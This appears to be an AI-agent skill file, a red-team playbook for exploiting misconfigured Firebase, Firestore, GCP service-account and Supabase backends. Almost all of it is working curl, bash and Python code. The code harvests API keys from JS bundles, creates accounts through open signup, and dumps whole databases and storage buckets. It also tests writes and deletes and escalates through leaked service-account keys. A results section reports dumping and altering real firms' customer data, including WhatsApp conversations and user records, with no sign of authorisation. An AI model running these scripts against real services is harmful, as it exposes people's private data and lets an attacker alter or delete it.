---
name: hunt-firebase
description: "Hunt Firebase / Firestore / GCP exploitation — Firebase API key discovery in JS bundles, anonymous auth via signUp endpoint, Firestore collection enumeration with anon key, Realtime Database read/write without auth, Firebase Storage bucket listing, Firebase Hosting detection, GCP service account JSON exploitation, IAM policy enumeration from leaked SA keys. Built from field experience where Firebase API keys in JS bundles unlocked full Firestore read-access on 12+ targets including healthcare platforms and delivery apps. Use when a JS bundle, APK, or .env file reveals a Firebase API key (AIzaSy...) or when target uses firebaseio.com / firestore.googleapis.com endpoints."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [firebase, hunt, redteam]
---

# HUNT-FIREBASE — Firebase / Firestore / GCP Exploitation

## Crown Jewel Targets

Firebase is Google's mobile/web platform. When developers embed the **API key** in the client (which is required by Firebase SDKs), they often forget to configure **Firestore Security Rules** or **Realtime Database Rules**, leaving all data publicly readable and writable.

**Highest-value findings:**
1. **Public Firestore Database** — anon key allows read/write to ALL collections → full data dump (users, messages, PII). Critical.
2. **Public Realtime Database** — `{database}.firebaseio.com/.json` returns all data without auth. Critical.
3. **Firebase Storage with public read** — storage bucket allows anonymous file listing and download. Critical.
4. **Firebase signUp open** — anyone can create an auth account, then use the JWT to access Firestore. High.
5. **Service Account JSON leaked** — full GCP IAM access to Firestore, Storage, Cloud Functions, IAM policy. Critical.
6. **Firebase Hosting with config leakage** — hosting reveals project ID and API key in static files.

---

## Phase 1 — Find the Firebase Project

Firebase is identified by its API key format: `AIzaSy[0-9A-Za-z_-]{35}`

### 1.1 Search in JS Bundles
```bash
# Download the main page and its JS bundles
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" -o /tmp/index.html
grep -Eo 'src="[^"]*\.js"' /tmp/index.html | cut -d'"' -f2 | while read js; do
  curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET$js" -o "/tmp/$(basename $js)"
done

# Search for Firebase API keys in all downloaded JS
grep -rEn 'AIza[0-9A-Za-z_-]{35}' /tmp/*.js

# Search for firebaseConfig
grep -rEn 'firebaseConfig|firebase.initializeApp|apiKey|authDomain' /tmp/*.js --include="*.js"

# Search for Firebase URLs
grep -rEn 'firebaseio|firestore|firebasestorage|firebaseapp' /tmp/*.js --include="*.js"

# Quick one-liner for any page
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'AIza[0-9A-Za-z_-]{35}'
```

### 1.2 Search in Source Maps
```bash
# First find source maps
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'sourceMappingURL=[^\"]+' | cut -d= -f2 | while read sm; do
  curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET$(echo $sm | sed 's|^/||')" -o "/tmp/$(basename $sm)"
done

# Extract all source files from maps
cat /tmp/*.map 2>/dev/null | python3 -c "
import sys, json, re, os
try:
    data = json.load(sys.stdin)
    sources = data.get('sourcesContent', [])
    for src in sources:
        if not src: continue
        keys = re.findall(r'AIza[0-9A-Za-z_-]{35}', src)
        for k in keys:
            print(f'FIREBASE_API_KEY: {k}')
        urls = re.findall(r'https://[^\"'\"]+firebaseio[^\"'\"]+', src)
        for u in urls:
            print(f'FIREBASE_URL: {u}')
except: pass
" 2>/dev/null
```

### 1.3 Search in .env and Config Files
```bash
# Firebase config often lives in .env
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/.env" | grep -i "FIREBASE"
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/.env.production" | grep -i "FIREBASE"

# Search in exposed JSON config
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/service-account.json" | python3 -m json.tool 2>/dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/firebase.json" | python3 -m json.tool 2>/dev/null
```

---

## Phase 2 — Firebase Project Reconnaissance

Once you have a Firebase API key (format: `AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`), you can probe the project.

### 2.1 Identify Firebase Project ID
```bash
# The project ID is encoded in the API key or can be found in the authDomain
# Auth domain pattern: <PROJECT_ID>.firebaseapp.com
API_KEY="AIzaSy..."

# Method 1: Try to sign in anonymously to get the project info
curl --max-time 30 --connect-timeout 10 -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}'
# Response includes: idToken, localId, refreshToken, expiresIn

# Method 2: Check if a known project ID works
for project in "$TARGET" "${TARGET%.*}" "app-${TARGET%.*}" "${TARGET//./-}"; do
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$project.firebaseio.com/.json")
  [ "$code" != "404" ] && echo "Hit: $project.firebaseio.com (HTTP $code)"
done

# Method 3: Search for the project ID in the bundle alongside the key
grep -B5 -A5 "AIzaSy" /tmp/*.js 2>/dev/null
```

### 2.2 Enumerate the Firebase Project
```bash
# Once project ID is known, probe all Firebase services
PROJECT="your-firebase-project-id"
API_KEY="AIzaSy..."

# Firestore REST API
curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY"
# If rules are permissive -> returns all documents

# Realtime Database
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/.json"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/.json?auth=$ID_TOKEN"

# Firebase Storage
# Two common formats:
curl --max-time 30 --connect-timeout 10 -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?key=$API_KEY"
curl --max-time 30 --connect-timeout 10 -sk "https://storage.googleapis.com/$PROJECT.appspot.com"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebasestorage.app"

# Firebase Hosting
curl --max-time 30 --connect-timeout 10 -skI "https://$PROJECT.firebaseapp.com"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.web.app"
```

---

## Phase 3 — Firestore Database Exploitation

Firestore Security Rules control who can read/write. When misconfigured (set to `true` for read), the entire database is public.

### 3.1 List Collections (with anon key)
```bash
API_KEY="AIzaSy..."
PROJECT="your-project-id"

# Step 1: Sign in anonymously
ANON_RESP=$(curl --max-time 30 --connect-timeout 10 -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}')
ID_TOKEN=$(echo "$ANON_RESP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('idToken', 'NO_TOKEN'))")

if [ "$ID_TOKEN" != "NO_TOKEN" ]; then
  echo "[+] Anonymous auth token obtained"

  # Step 2: List all documents in root collection
  curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY" \
    -H "Authorization: Bearer $ID_TOKEN" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    docs = d.get('documents', [])
    print(f'Documents: {len(docs)}')
    for doc in docs[:20]:
        path = doc.get('name', '').split('/')[-1]
        print(f'  Document: {path}')
        fields = doc.get('fields', {})
        for key, val in fields.items():
            val_type = list(val.keys())[0] if val else 'unknown'
            val_snippet = str(list(val.values())[0])[:50] if val else ''
            print(f'    {key}: {val_snippet}')
except Exception as e:
    print(f'No data: {e}')
"
else
  echo "[-] Cannot obtain anonymous auth token"
fi
```

### 3.2 Dump All Collections (recursive)
```bash
# Firestore collection group query — enumerate ALL collections
curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:listCollectionIds?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -X POST -d '{}'

# For each collection, dump documents
curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/{COLLECTION_NAME}?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"

# Run collectionGroup query (finds nested collections too)
curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"structuredQuery": {"from": [{"collectionId": "*"}]}}'
```

### 3.3 Test Write Access
```bash
# Try to write a document (only if rules allow)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/test_collection?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"fields": {"test": {"stringValue": "pwned"}}}'

# If 200 -> write access confirmed -> CRITICAL
# Try to delete
curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/test_collection/TEST_DOC?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"
# If 200 -> delete access confirmed -> CRITICAL
```

---

## Phase 4 — Realtime Database Exploitation

Firebase Realtime Database uses a different API path.

```bash
# Read entire database (if rules allow public read)
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/.json"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/.json?print=pretty"

# With auth token
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/.json?auth=$ID_TOKEN"

# Specific path
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/users.json"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/messages.json"
curl --max-time 30 --connect-timeout 10 -sk "https://$PROJECT.firebaseio.com/config.json"

# Test write
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://$PROJECT.firebaseio.com/test.json" \
  -H "Content-Type: application/json" \
  -d '{"pwned": true}'

# Test delete
curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://$PROJECT.firebaseio.com/test.json"
```

---

## Phase 5 — Firebase Storage Exploitation

```bash
# List all files in the default storage bucket
curl --max-time 30 --connect-timeout 10 -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?key=$API_KEY" | \
  python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    items = d.get('items', [])
    for item in items:
        name = item.get('name', '')
        bucket = item.get('bucket', '')
        print(f'{bucket}: {name}')
except Exception as e:
    print(f'Error: {e}')
"

# Download a specific file
curl --max-time 30 --connect-timeout 10 -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o/{ENCODED_FILE_PATH}?alt=media&key=$API_KEY" \
  -o /tmp/firebase_file

# Upload a file (test write access)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?name=test_pwned.txt&key=$API_KEY" \
  -H "Content-Type: text/plain" \
  -d "pwned"
```

---

## Phase 6 — Firebase Auth Exploitation

### 6.1 Sign Up (if email/password auth is enabled)
```bash
# Create an auth account
curl --max-time 30 --connect-timeout 10 -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "returnSecureToken": true
  }'
# If 200 -> anyone can create accounts!
```

### 6.2 Sign In
```bash
# Sign in with known credentials
curl --max-time 30 --connect-timeout 10 -sk "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "returnSecureToken": true
  }'

# Extract idToken -> use for Firestore/RTDB/Storage access
ID_TOKEN=$(...)
```

### 6.3 List Auth Providers
```bash
# Check which auth providers are enabled
curl --max-time 30 --connect-timeout 10 -sk "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"identifier": "test@test.com", "continueUri": "http://localhost"}'
# Response shows: allSignInMethods (password, google.com, facebook.com, etc.)
```

---

## Phase 7 — Service Account JSON Exploitation

If you find a Firebase/GCP service account JSON file:

```bash
# The file looks like:
# {
#   "type": "service_account",
#   "project_id": "...",
#   "private_key_id": "...",
#   "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
#   "client_email": "...@....gserviceaccount.com",
#   "client_id": "...",
#   "auth_uri": "https://accounts.google.com/o/oauth2/auth",
#   "token_uri": "https://oauth2.googleapis.com/token"
# }

# Save it and authenticate with gcloud
echo '{"type": "service_account", ...}' > /tmp/sa-key.json

# Authenticate
gcloud auth activate-service-account --key-file=/tmp/sa-key.json

# List all accessible resources
gcloud projects get-iam-policy $PROJECT_ID
gcloud iam service-accounts list
gcloud firestore databases list
gcloud storage buckets list
gcloud functions list
gcloud run services list

# Firestore read using the service account
gcloud firestore export gs://$BUCKET/export/  # Export entire Firestore

# Access Firestore REST API with JWT
# The service account can generate its own OAuth tokens
OAUTH_TOKEN=$(gcloud auth print-access-token)

# Use token for Firestore API
curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents" \
  -H "Authorization: Bearer $OAUTH_TOKEN"

# IAM exploration
curl --max-time 30 --connect-timeout 10 -sk "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -H "Authorization: Bearer $OAUTH_TOKEN" \
  -X POST -H "Content-Type: application/json" -d '{}'
```

---

## Phase 8 — Attack Chains

### Chain A: API Key in JS -> Anon Auth -> Firestore Dump
```
JS bundle contains Firebase API key (AIzaSy...) ->
Sign in anonymously (accounts:signUp) ->
Get ID token ->
List Firestore collections ->
Dump ALL documents -> Data breach
```

### Chain B: API Key in JS -> Open SignUp -> Auth -> Write Access
```
Firebase config found in JS ->
Email/password signUp enabled (not just anon) ->
Anyone creates accounts ->
Access Firestore with credentials ->
Write malicious data or delete collections
```

### Chain C: Service Account JSON -> GCP Full Access
```
SA key found in .env or leaked repo ->
gcloud auth activate-service-account ->
Get IAM policy ->
List all resources ->
Export Firestore, access Storage, invoke Cloud Functions
```

---

## Validation Severity

| Finding | Severity |
|---------|----------|
| Firestore public read (collections with PII dumpable) | Critical |
| Firestore public write (can create/delete documents) | Critical |
| Realtime Database public read (full .json dump) | Critical |
| Firebase Storage public list/download | High |
| Open signUp (anyone can create accounts) | High |
| Service Account JSON exposed | Critical |
| API key found (with no further access) | Low-Medium |
| Firebase Hosting static site exposed | Informational |
| Firebase project ID exposed (no key) | Informational |

---

## Common Firebase Finding Formats

```bash
# Quick test: does the target use Firebase?
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'AIza[0-9A-Za-z_-]{35}'
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'firebaseio\.com|firestore\.googleapis|firebaseapp\.com'

# Check Google dorks for Firebase
# site:target.com "firebase"
# site:target.com "AIzaSy" filetype:js
# site:target.com "firebaseConfig"
```

---

## Verification

Run this self-test to confirm firebase hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-firebase" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **Public Firebase config without sensitive data** — the Firebase config object is intentionally public. Only report when the database/storage is writable or contains PII.
- **Realtime DB rules test without write** — reading `.json` is recon. Writing to `.json` and having it persist proves misconfiguration.
- **Firestore public read** — test `/documents/users` for PII, not `/documents/public_config`.
- **Storage bucket listing without object read** — listable buckets are informational. Need readable objects with sensitive content.
- **API key scope testing** — Firebase API keys are not secrets. They're identifiers. Test what the key grants access to, not just that it exists.


---

## Content from local version



## How to Run

```bash
# Firebase Firestore — list collections (if public)
curl -sk "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/"

# Supabase — list users table (if RLS missing)
curl -sk "https://PROJECT.supabase.co/rest/v1/users" \
  -H "apikey: ANON_KEY" -H "Authorization: Bearer ANON_KEY"

# Supabase — test signup (if open)
curl -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
  -H "apikey: ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"Test123!"}'
```



## Real Production Results

### delivery-platform (Firebase)
- **Firestore `conversationsV3`**: 204K WhatsApp conversations, 173K unique phone numbers, 497 stores — PUBLICLY READABLE
- **Firestore `stores`**: 4,000 stores with CNPJ, phone, GPS, menu — PATCH write confirmed
- **Firebase Auth**: signup open, anyone can create accounts
- **Storage**: 1,000+ MP3 audio files (WhatsApp voice messages) publicly accessible
- **Impact**: Full customer communication data, store management access

### visa-processing-platform (Supabase)
- **REST API**: Anon key grants full SELECT on users (64,105 records), relatorios (46,717), purchase (676)
- **CRUD**: DELETE confirmed on relatorio_completo, UPDATE confirmed on etapa
- **Auth**: signup open, email auto-confirmed
- **Storage**: relatorios and videos buckets public

### fitness-chain (Firebase — 5 projects, multi-cloud)
- 5 Firebase projects, 21 hardcoded credentials (MySQL, SendGrid, OVH S3, Algolia, ChatSkills, Redis, reCAPTCHA)
- Service Account keys → GCP IAM escalation (storage.admin, firebaseappcheck.admin, iam.serviceAccountTokenCreator)
- 16,179 files in Firebase Storage



## Quick Reference

| Platform | What to Find | Exploit Path | Real Example |
|----------|-------------|-------------|--------------|
| Firebase Firestore | Public database rules | Direct REST API access, list all collections | delivery-platform: 204K conversations public |
| Firebase Storage | Public bucket rules | Download all files via REST API | delivery-platform: 1,000+ WhatsApp audio files public |
| Firebase Auth | Open signup | Create accounts, access protected resources | fitness-chain: Firebase Auth signup open |
| Firebase SA Key | Service account JSON | GCP IAM escalation, access all GCP resources | fitness-chain: 5 SA keys → full GCP access |
| Supabase REST | Missing RLS | SELECT/INSERT/UPDATE/DELETE on any table | visa-processing-platform: 64K users, 46K reports, DELETE confirmed |
| Supabase Storage | Public buckets | Download all files, upload malicious content | visa-processing-platform: public PDF reports bucket |
| Supabase Auth | Open signup | Create accounts, bypass access controls | dental-booking: open signup + auto-confirm |



## Prerequisites

- `terminal` tool with curl, python3, jq.
- Firebase project ID or Supabase URL + anon key (from JS bundle, source leak, or recon).
- For Firebase SA key exploitation: `python3` with `google-auth` library.



## Procedure

### Phase 1 — Extract Configuration from JS Bundles

```bash
TARGET="$1"
OUTDIR="/root/output/firebase_supabase/$TARGET"
mkdir -p "$OUTDIR"

# Download homepage and common JS entry points
curl -sk "https://$TARGET/" -o "$OUTDIR/index.html"
curl -sk "https://$TARGET/app.js" -o "$OUTDIR/app.js" 2>/dev/null
curl -sk "https://$TARGET/main.js" -o "$OUTDIR/main.js" 2>/dev/null

echo "[*] Extracting Firebase/Supabase configs..."

# Firebase config pattern
grep -oP 'apiKey["\s:]+["][^"]+["]|projectId["\s:]+["][^"]+["]|firebase\.initializeApp' \
  "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u

# Supabase config pattern
grep -oP 'supabase\.co[^"'\'' ]+|supabaseUrl["\s:]+["][^"]+["]|supabaseKey["\s:]+["][^"]+["]|anon[_-]?key["\s:=]+["][^"]{20,}["]' \
  "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u
```

### Phase 2 — Firebase Firestore Exploitation

```bash
PROJECT_ID="$1"  # e.g., delivery-bot-platform

echo "[*] Firestore enumeration for $PROJECT_ID"

# List root collections (if public)
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" | \
  python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if 'documents' in data:
        print(f'ERROR: {len(data[\"documents\"])} root docs — not a collection list')
    else:
        for k in data.keys():
            print(f'Collection: {k}')
except Exception as e:
    print(f'Error: {e}')
    print(sys.stdin.read()[:500])
" 2>/dev/null

# If Firestore requires auth, try with Firebase ID token from Auth
# (see Phase 4 for token generation via signup)
```

### Phase 3 — Firestore Collection & Document Access

```bash
PROJECT_ID="$1"
COLLECTION="$2"  # e.g., conversationsV3, users, stores

echo "[*] Accessing collection: $COLLECTION"

# List documents in collection
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'documents' in data:
    print(f'Documents found: {len(data[\"documents\"])}')
    for doc in data['documents'][:5]:
        name = doc['name'].split('/')[-1]
        fields = doc.get('fields', {})
        # Extract top-level fields
        keys = list(fields.keys())[:10]
        print(f'  {name}: {keys}')
    if len(data['documents']) > 5:
        print(f'  ... and {len(data[\"documents\"]) - 5} more')
elif 'error' in data:
    print(f'Error: {data[\"error\"][\"message\"]}')
" 2>/dev/null

# Read a specific document
DOC_ID="$3"  # from the listing above
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION/$DOC_ID" | \
  python3 -m json.tool 2>/dev/null | head -50
```

### Phase 4 — Firebase Auth Signup & Token Generation

```bash
API_KEY="$1"  # from JS bundle (web API key)
PROJECT_ID="$2"

echo "[*] Testing Firebase Auth signup on $PROJECT_ID"

# Sign up
SIGNUP_RESP=$(curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!","returnSecureToken":true}')

if echo "$SIGNUP_RESP" | grep -q "idToken"; then
  echo "[+] SIGNUP OPEN — account created!"
  ID_TOKEN=$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['idToken'])" 2>/dev/null)
  echo "  ID Token: ${ID_TOKEN:0:50}..."

  # Now use this token with Firestore
  echo "[*] Testing Firestore access with ID token..."
  curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" \
    -H "Authorization: Bearer $ID_TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'documents' in data:
    print(f'[+] ACCESS GRANTED — {len(data[\"documents\"])} collections visible')
elif 'error' in data:
    print(f'[-] Access denied: {data[\"error\"][\"message\"]}')
else:
    print(f'[?] Unknown response: {list(data.keys())}')
" 2>/dev/null
else
  echo "[-] Signup blocked: $(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('error',{}).get('message','unknown'))" 2>/dev/null)"
fi
```

### Phase 5 — Firebase Storage Enumeration

```bash
PROJECT_ID="$1"
BUCKET="${PROJECT_ID}.appspot.com"  # default bucket name

echo "[*] Storage enumeration for $BUCKET"

# List objects (if public)
curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'items' in data:
    total = len(data['items'])
    total_size = sum(int(i.get('size', 0)) for i in data['items'])
    print(f'Objects: {total} ({total_size:,} bytes)')
    for item in data['items'][:5]:
        print(f'  {item[\"name\"]} ({item.get(\"size\",0):,} bytes)')
elif 'error' in data:
    print(f'Error: {data[\"error\"][\"message\"]}')
"

# Download a specific file
OBJECT_NAME="$2"  # from listing
curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/$OBJECT_NAME?alt=media" \
  -o "/tmp/firebase_$OBJECT_NAME"
echo "[+] Downloaded to /tmp/firebase_$OBJECT_NAME"
```

### Phase 6 — Supabase REST API Exploitation

```bash
SUPABASE_URL="$1"  # e.g., https://gfgmuezavgzjmaxhflsu.supabase.co
ANON_KEY="$2"       # from JS bundle

echo "[*] Supabase REST API enumeration"

# Schema discovery — list tables by querying common names
TABLES=("users" "profiles" "organizations" "posts" "comments" "purchases"
        "orders" "products" "reports" "relatorios" "documents" "files"
        "messages" "conversations" "sessions" "audit_logs")

for table in "${TABLES[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    count=$(curl -sk "$SUPABASE_URL/rest/v1/$table?limit=0" \
      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
      -H "Prefer: count=exact" -I 2>/dev/null | grep -i "content-range" | grep -oP '\d+(?=/\d+$)')
    echo "  [TABLE] $table — HTTP 200 (${count:-?} rows)"

    # Fetch first 3 rows
    curl -sk "$SUPABASE_URL/rest/v1/$table?limit=3" \
      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | \
      python3 -m json.tool 2>/dev/null | head -20
    echo ""
  elif [[ "$code" == "401" || "$code" == "403" ]]; then
    echo "  [BLOCKED] $table — HTTP $code (RLS protected)"
  fi
done
```

### Phase 7 — Supabase CRUD Testing (RLS Bypass)

```bash
SUPABASE_URL="$1"
ANON_KEY="$2"
TABLE="$3"  # from table discovery above

echo "[*] CRUD testing on $TABLE"

# INSERT
echo -n "  INSERT: "
curl -sk -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"test":"rls_bypass_probe_'$(date +%s)'"}' \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""

# UPDATE (PATCH)
echo -n "  UPDATE: "
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"test":"rls_updated"}' \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""

# DELETE
echo -n "  DELETE: "
curl -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Prefer: return=minimal" \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""
```

### Phase 8 — Supabase Auth Signup

```bash
SUPABASE_URL="$1"
ANON_KEY="$2"

echo "[*] Supabase Auth signup test"

SIGNUP_RESP=$(curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!"}')

if echo "$SIGNUP_RESP" | grep -q "access_token"; then
  echo "[+] SIGNUP OPEN!"
  ACCESS_TOKEN=$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
  echo "  Access Token: ${ACCESS_TOKEN:0:50}..."

  # Test cross-org access (change organization_id in profile)
  curl -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])" 2>/dev/null)" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" -H "Prefer: return=representation" \
    -d '{"organization_id":1}' 2>/dev/null | python3 -m json.tool 2>/dev/null
  echo "  [*] If the above returned data for org_id=1, cross-organization access works"
else
  echo "[-] Signup blocked: $(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('msg','unknown'))" 2>/dev/null)"
fi
```



## When to Use

- JavaScript bundle analysis reveals Firebase config (`apiKey`, `projectId`) or Supabase URL + anon key.
- Target uses a modern SPA (React, Vue, Angular) with BaaS backend.
- After `js-secrets-extraction` finds Firebase/Supabase identifiers.
- After `source-leak-hunt` finds `.env` with `FIREBASE_*` or `SUPABASE_*` variables.

